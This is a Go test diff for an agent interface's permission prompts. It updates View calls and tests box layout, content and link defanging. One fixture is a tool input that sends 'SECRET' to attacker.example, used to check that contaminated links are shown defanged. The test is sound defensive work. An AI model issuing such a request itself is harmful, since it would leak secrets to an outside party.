@@ -30,7 +30,7 @@ func TestPermissionViewBounded(t *testing.T) {
 		width := rapid.IntRange(1, 90).Draw(t, "width")
 		height := rapid.IntRange(2, 40).Draw(t, "height")
 		now := t0.Add(time.Duration(rapid.IntRange(0, 2000).Draw(t, "ms")) * time.Millisecond)
-		f := View(s, "› ", "", now, width, height)
+		f := View(core.Single{State: s}, "› ", "", now, width, height)
 		rows := strings.Split(f.Content, "\n")
 		if len(rows) != height-1 {
 			t.Fatalf("%d rows, want %d", len(rows), height-1)
@@ -60,7 +60,7 @@ func TestPermissionBoxContent(t *testing.T) {
 	s, _ = core.Reduce(s, core.PermissionAsked{At: t0, Permission: core.Permission{ID: 1, Name: "memo_send",
 		Input:   "{" + strings.Join(in, ",") + "}",
 		Options: []core.PermOption{{ID: "a", Name: "Allow once", Kind: core.AllowOnce}, {ID: "r", Name: "Reject", Kind: core.RejectOnce}}}})
-	out := ansi.Strip(View(s, "› ", "", t0.Add(time.Second), 60, 30).Content)
+	out := ansi.Strip(View(core.Single{State: s}, "› ", "", t0.Add(time.Second), 60, 30).Content)
 	for _, want := range []string{"permission needed", "memo_send", `"k": 1`, "more lines · v to see all", "Allow once (y)", "▸ Reject (n)", "esc cancel"} {
 		if !strings.Contains(out, want) {
 			t.Errorf("%q missing from:\n%s", want, out)
@@ -79,7 +79,7 @@ func TestRequestInputLinksDefangWhenContaminated(t *testing.T) {
 		Input:   `{"url":"https://attacker.example/?data=SECRET"}`,
 		Options: []core.PermOption{{ID: "r", Name: "Reject", Kind: core.RejectOnce}}}
 	s, _ := core.Reduce(busy, core.PermissionAsked{At: t0, Permission: p})
-	box := ansi.Strip(View(s, "› ", "", t0.Add(time.Second), 80, 30).Content)
+	box := ansi.Strip(View(core.Single{State: s}, "› ", "", t0.Add(time.Second), 80, 30).Content)
 	if strings.Contains(box, "https://") || !strings.Contains(box, "hxxps://attacker[.]example") {
 		t.Errorf("box:\n%s", box)
 	}
